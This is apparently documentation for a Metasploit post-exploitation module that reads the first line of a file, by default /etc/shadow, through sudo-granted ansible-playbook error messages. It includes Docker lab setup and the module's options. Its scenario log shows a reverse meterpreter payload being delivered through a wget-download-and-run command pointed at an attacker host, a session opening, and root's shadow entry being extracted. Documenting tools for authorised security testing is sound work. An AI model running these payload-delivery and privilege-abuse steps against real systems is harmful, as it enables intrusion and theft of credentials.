## Vulnerable Application

This module will read the first line of a file based on an error message from ansible-playbook with sudo privileges.
ansible-playbook takes a yaml file as input, and if there is an error, such as a non-yaml file, it outputs the line
where the error occurs. This can be exploited to read the first line of the file, which we'll typically want to read
/etc/shadow to obtain root's hash.

### Docker-compose Install

Use the ansible lab files located [here](https://github.com/abdennour/ansible-lab-environment-in-containers).

Before bringing up the `docker-compose` instance, you'll want to generate an SSH key: `ssh-keygen -t rsa -N "" -f secrets/id_rsa`

Of note, only 1 of the 3 alpine hosts will be successful due to the port conflict. This is fine though.

Next you'll need to add a user:

```
docker exec -it ansible-lab-environment-in-containers_controlnode_1 /bin/sh
useradd user
chmod o+w /etc/sudoers
echo -ne "\nuser ALL=(ALL) NOPASSWD: /usr/local/bin/ansible-playbook *\n" >> /etc/sudoers
chmod o-w /etc/sudoers
```

## Verification Steps

1. Install the application
1. Start msfconsole
1. Get an initial shell on the box
1. Do: `use post/linux/gather/ansible_playbook_error_message_file_reader`
1. Do: `set session [#]`
1. Do: `run`
1. You should be able to read the top line of a file.

## Options

### ANSIBLEPLAYBOOK

Location of ansible-playbook executable if not in a standard location. This is added to a list of default locations
which includes `/usr/local/bin/ansible-playbook`, `/usr/bin/ansible-playbook`. Defaults to ``

### FILE

File to be read. Defaults to `/etc/shadow`

### FULLOUTPUT

If the entire command output should be displayed, or only the error line. Defaults to `false`

## Scenarios

### Docker compose as mentioned above

Get initial access to the system

```
resource (ansible_playbook.rb)> use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
resource (ansible_playbook.rb)> set lhost 192.168.2.128
lhost => 192.168.2.128
resource (ansible_playbook.rb)> set srvport 8181
srvport => 8181
resource (ansible_playbook.rb)> set lport 8183
lport => 8183
resource (ansible_playbook.rb)> set target 7
target => 7
resource (ansible_playbook.rb)> set payload payload/linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
resource (ansible_playbook.rb)> run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.2.128:8183 

[*] Using URL: http://192.168.2.128:8181/I5062GM5P5Avgu
[*] Server started.
[*] Run the following command on the target machine:
wget -qO lAM5H81x --no-check-certificate http://192.168.2.128:8181/I5062GM5P5Avgu; chmod +x lAM5H81x; ./lAM5H81x& disown

[*] Starting persistent handler(s)...
[*] 172.28.0.3       web_delivery - Delivering Payload (250 bytes)
[*] Sending stage (3045380 bytes) to 172.28.0.3
[*] Meterpreter session 1 opened (192.168.2.128:8183 -> 172.28.0.3:37216) at 2023-12-13 14:58:36 -0500
[msf](Jobs:1 Agents:1) post(linux/gather/ansible_playbook_error_message_file_reader) > sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(/playbook) > getuid
Server username: user
(Meterpreter 1)(/playbook) > cat /etc/shadow
[-] core_channel_open: Operation failed: 1
(Meterpreter 1)(/playbook) > background
[*] Backgrounding session 1...
```

```
resource (ansible_playbook.rb)> use post/linux/gather/ansible_playbook_error_message_file_reader
resource (ansible_playbook.rb)> set session 1
session => 1
resource (ansible_playbook.rb)> set verbose true
verbose => true
[msf](Jobs:1 Agents:1) post(linux/gather/ansible_playbook_error_message_file_reader) > run

[*] Checking sudo
[*] Executing: sudo -n -l
[*] Executing: sudo -n /usr/local/bin/ansible-playbook /etc/shadow
[+] root:!::0:::::
[*] Post module execution completed
```